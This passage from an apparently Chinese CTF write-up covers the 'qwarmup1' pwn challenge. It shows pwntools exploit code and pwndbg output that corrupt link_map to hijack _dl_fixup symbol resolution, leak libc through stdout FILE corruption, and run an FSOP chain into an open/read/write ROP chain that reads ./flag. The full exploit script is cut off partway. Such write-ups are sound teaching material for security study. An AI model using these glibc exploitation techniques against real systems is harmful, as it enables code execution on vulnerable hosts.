<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fcefdddf2e8</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fcefdddf2f0</span> —▸ <span class="number">0x55a47f543df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fcefdddf2f8</span> —▸ <span class="number">0x7fcefdddf890</span> —▸ <span class="number">0x7ffdfdf5b000</span> ◂— jg     <span class="number">0x7ffdfdf5b047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fcefdddf300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fcefdddf308</span> —▸ <span class="number">0x7fcefdddf2e0</span> —▸ <span class="number">0x55a47f540000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fcefdddf310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fcefdddf318</span> —▸ <span class="number">0x7fcefdddf870</span> —▸ <span class="number">0x7fcefdddf888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7fcefda86000</span> <span class="number">0x7fcefdddf2e0</span></span><br><span class="line"><span class="number">0x7fcefda86000</span>-&gt;<span class="number">0x7fcefdddf2e0</span> is <span class="number">0x3592e0</span> bytes (<span class="number">0x6b25c</span> words)</span><br></pre></td></tr></table></figure>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span> - <span class="number">0x10</span> <span class="comment"># 通过mmap申请的chunk与link_map之间的偏移</span></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span> <span class="comment"># 位于bss段的size</span></span><br><span class="line"></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>]))</span><br></pre></td></tr></table></figure>
<ul>
<li>执行覆盖的汇编代码：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x70</span> <span class="comment">/* 计算出来的,用于覆盖link_map-&gt;l_addr末尾的值 */</span></span><br><span class="line"> RDX  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"></span><br><span class="line"> ► <span class="number">0x556d291ff4bb</span>    mov    byte ptr [rdx], al</span><br></pre></td></tr></table></figure>
<ul>
<li>修改前：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>修改后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f9e9d695000</span>+<span class="number">0x3592e0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span> <span class="comment">/* link_map-&gt;l_addr */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7f9e9d9ee2e8</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7f9e9d9ee2f0</span> —▸ <span class="number">0x556d29201df8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7f9e9d9ee2f8</span> —▸ <span class="number">0x7f9e9d9ee890</span> —▸ <span class="number">0x7ffec7501000</span> ◂— jg     <span class="number">0x7ffec7501047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7f9e9d9ee300</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7f9e9d9ee308</span> —▸ <span class="number">0x7f9e9d9ee2e0</span> —▸ <span class="number">0x556d291fe070</span> ◂— <span class="number">0x8</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7f9e9d9ee310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7f9e9d9ee318</span> —▸ <span class="number">0x7f9e9d9ee870</span> —▸ <span class="number">0x7f9e9d9ee888</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <code>l-&gt;l_addr + reloc-&gt;r_offset</code> 公式来计算 <code>write@got</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elf64_Rela &lt;<span class="number">4018</span>h, <span class="number">300000007</span>h, <span class="number">0</span>&gt;       ; R_X86_64_JUMP_SLOT write</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: hex(<span class="number">0x556d291fe070</span>+<span class="number">0x4018</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">&#x27;0x556d29202088&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>_dl_fixup_</code> 执行完毕以后，就会根据错误的 <code>link_map-&gt;l_addr</code> 来把错误的地址给改为 <code>write</code> 的真实地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x000f000000000000</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">0x556d29202088</span>:	<span class="number">0x00007f9e9d89da20</span>	<span class="number">0x6261747274736873</span></span><br><span class="line"><span class="number">0x556d29202098</span>:	<span class="number">0x707265746e692e00</span>	<span class="number">0x672e65746f6e2e00</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x556d29202088</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x556d29202088</span> —▸ <span class="number">0x7f9e9d89da20</span> (write) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>我们可以发现 <code>bss-&gt;size</code> &lt; 0x10000，程序循环</li>
</ul>
<p>程序循环了，我们可以在 libc 中写入任意数据，不过我们想要泄露 libc_base 需要用到 <code>_dl_fixup_</code> 的机制：</p>
<ul>
<li>由于 write 的函数地址没有成功回填到 GOT 表，后面每次调用还会走 symbol 查找流程：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123; </span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]); <span class="comment">// DT_STRTAB id=5</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">  result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">  value = DL_FIXUP_MAKE_VALUE (result,sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>_dl_lookup_symbol_x</code> 函数的第一个参数就是待查找函数的函数名，而 <code>sym-&gt;st_name</code> 对于同一个函数而言是一个固定值（“write” = 34） </li>
<li>而 <code>strtab</code> 则是来源于于 libc 上的全局结构体 <code>link_map</code>，那么可以劫持 <code>link_map-&gt;l_info[DT_STRTAB]</code> ，使其指向可控内存段（比如说：<code>link_map-&gt;l_info[DT_DEBUG]</code>），达到任意函数调用</li>
</ul>
<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址，可以通过改写最低位：</p>
<ul>
<li>把 <code>link_map-&gt;l_info[DT_STRTAB]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_DEBUG]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
<li>于是我们提前在 <code>DT_DEBUG+34</code>（原来是 <code>DT_STRTAB+34</code>）的位置写上 <code>[function_name]</code>，就可以达到任意函数调用</li>
</ul>
<p>我们可以利用这个机制来 leak libc_base，示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>))</span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) </span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<ul>
<li>思路还是和上面的一样，只是执行的函数为 <code>_IO_flush_all</code></li>
<li>于是我们在 <code>_IO_2_1_stdout_</code> 中修改 FILE 结构体的条目，经过如下调用链后泄露 libc_base：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup -&gt; _dl_lookup_symbol_x -&gt; _IO_flush_all</span><br></pre></td></tr></table></figure>
<p>最后用同样的方法执行 FSOP，使用 <code>_IO_wdefault_xsgetn</code> 的调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all -&gt; _IO_flush_all_lockp -&gt; _IO_wdefault_xsgetn -&gt; _IO_switch_to_wget_mode</span><br></pre></td></tr></table></figure>
<p>示例代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi+0x48)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x1</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br></pre></td></tr></table></figure>
<ul>
<li>先还原 <code>DT_STRTAB</code></li>
<li>修改 <code>_IO_2_1_stdout_ FILE</code> 结构体，利用 vtable 偏移的思想实现 vtable 任意函数调用（<code>_IO_flush_all_lockp</code> 原本会调用 <code>_IO_wstrn_overflow</code> ，修改 vtable 偏移后变为调用 <code>_IO_wdefault_xsgetn</code>）</li>
<li>然后在 <code>_IO_wide_data_1</code> 中伪造数据：<ul>
<li><code>_IO_wide_data_1+0x20</code> -&gt; [RDX]</li>
<li><code>_IO_wide_data_1+0xe0</code> -&gt; [RAX]</li>
</ul>
</li>
<li>我们可以控制 [RAX]，并且在 [RAX+0x18] 中提前写入 ROP 的地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x7f8099bc0108</span> ◂— <span class="number">0x40</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"> RDI  <span class="number">0x7f8099ece780</span> (_IO_2_1_stdout_) ◂— <span class="number">0x800</span></span><br><span class="line"> RDX  <span class="number">0x1</span></span><br><span class="line">*RIP  <span class="number">0x7f8099d37d55</span> (_IO_switch_to_wget_mode+<span class="number">37</span>) ◂— call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f8099bc0108</span>+<span class="number">0x18</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f8099bc0120</span> —▸ <span class="number">0x7f8099e1e1fa</span> (svcudp_reply+<span class="number">26</span>) ◂— mov    rbp, qword ptr [rdi + <span class="number">0x48</span>] <span class="comment">/* ROP */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gadget svcudp_reply 可以控制会 [RBP] 为 [RDI+0x48]（我们提前在 <code>_IO_2_1_stdout_+0x48</code> 中伪造好 ROP_addr），同时会 call [RAX+0x28]，在这里放入 <code>leave ret</code> 就利用控制栈了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./qwarmup1&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory /home/yhellow/tools/debuglibc/2.35-0ubuntu3_amd64/usr/lib/debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14A7)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14D1)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14BB)\n&quot;</span></span><br><span class="line"></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./qwarmup1&quot;</span>,cmd)</span><br><span class="line"><span class="comment">#p = process(&quot;./qwarmup1&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1491)\n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span>-<span class="number">0x10</span></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>])) <span class="comment"># overwrite &amp;size-4 = write@libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>)) <span class="comment"># _flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) <span 